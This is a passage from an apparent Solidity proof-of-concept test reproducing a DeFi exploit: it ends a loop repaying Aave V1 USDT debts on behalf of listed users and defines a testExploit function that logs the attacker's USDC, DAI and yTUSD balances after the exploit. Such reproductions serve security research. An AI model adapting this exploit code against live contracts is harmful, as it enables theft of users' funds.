            if (amount != 0) {
                uint256 repaymentAmount = (amount * 101) / 100;
                LendingPool.repay(address(usdt), repaymentAmount, aaveV1UsdtDebtUsers[i]);
            }
        }
    }

    function testExploit() public {
        init();
        run();
        emit log_named_decimal_uint("[End]   Attacker USDC balance after exploit", usdc.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[End]   Attacker DAI balance after exploit", dai.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End]   Attacker YTUSD balance after exploit", yTUSD.balanceOf(address(this)), 18);
    }

}
